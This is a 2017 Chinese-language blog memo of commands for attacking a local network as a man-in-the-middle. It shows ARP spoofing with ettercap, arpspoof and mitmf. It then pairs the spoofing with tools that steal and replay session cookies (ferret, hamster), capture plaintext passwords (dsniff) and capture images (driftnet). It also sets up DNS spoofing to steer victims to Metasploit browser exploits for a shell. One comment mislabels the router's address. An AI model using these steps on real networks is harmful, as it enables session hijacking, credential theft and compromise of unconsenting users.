---
layout:     post
title:      内网中间人玩法备忘录
date:       2017-05-16
summary:    内网中间人玩法备忘录
categories: web
tags:
 - 中间人
 - 内网
---

### 0x00 About

```
记录内网中间人的玩法
```

### 0x01 欺骗方法

```
a)ettercap
    ettercap -Tqi eth0 -M arp /ip// /ip//
b)arpspoof
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i eth0 -t 192.168.1.101 192.168.1.1
        让受害者以为自己是网关
    arpspoof -i eth0 -t 192.168.1.1 192.168.1.101
        让网关以为自己是受害者
c)mitmf
    mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
```

### 0x02 利用原理

```
利用中间人欺骗(ettercap,arpspoof,mitmf)使流量经过本机,然后通过数据分析工具(ferret,wireshark,dsniff,driftnet)提取出重要信息(cookie,passwords,pictures)
```

### 0x03 不同组合

#### 0xa ettercap+ferret+hamster

```
作用:监听cookie达到会话劫持的目的

1.ettercap:让数据经过本机网卡
ettercap -Tqi eth0 -M arp /192.168.1.1// ///
    欺骗路由器192.168.1.1和其他机器的通话
    ettercap -Tqi eth0 -M arp /// ///
        欺骗任意两台机器之间的通话
    ettercap -Tqi eth0 -M arp /192.168.1.101// /192.168.1.1//
        欺骗192.168.1.101和路由器192.168.1.101之间的通话

2.ferret:取cookie
ferret -i eth0
    kali(x64)没有ferret,需要如下命令安装:
    dpkg --add-architecture i386 && apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y && aptitude install ferret-sidejack:i386

3.hamster:利用cookie
hamster
    需要设置浏览器的代理为127.0.0.1:1234,并在浏览器中访问http://hamster
```

#### 0xb cain

```
作用:获取密码
```

#### 0xc mitmf+dsniff 

```
作用:获取明文密码

mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
dsniff -i eth0
    或dsniff -p file.pcap(这里需要中间人欺骗后wireshark抓包)
```

#### 0xd ettercap+driftnet

```
作用:获取图片

ettercap -Tqi eth0 -M arp /192.168.1.1// ///
driftnet -i eth0 -a -d /tmp/output/
    或driftnet -f file.pcap -a -d /tmp/output/(这里需要中间人欺骗后wireshark抓包)
```

#### 0xe ettercap+ie(firefox,chrome,safari)漏洞

```
作用:获取shell

vim /etc/ettercap/etter.conf
    编辑将euid和egid设置为0,并设置使用iptables或是ipchains,设置完成后再运行下面的命令,或者参考如下
        https://www.youtube.com/watch?v=tW_NMG2IZ5s

vim /etc/ettercap/etter.dns
    添加* A 192.168.1.101在开始设置解析的地方

ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
    ettercap -P list可查看支持的插件
    这里用的是dns欺骗插件

msf设置利用ie漏洞或其他浏览器的漏洞
    
```
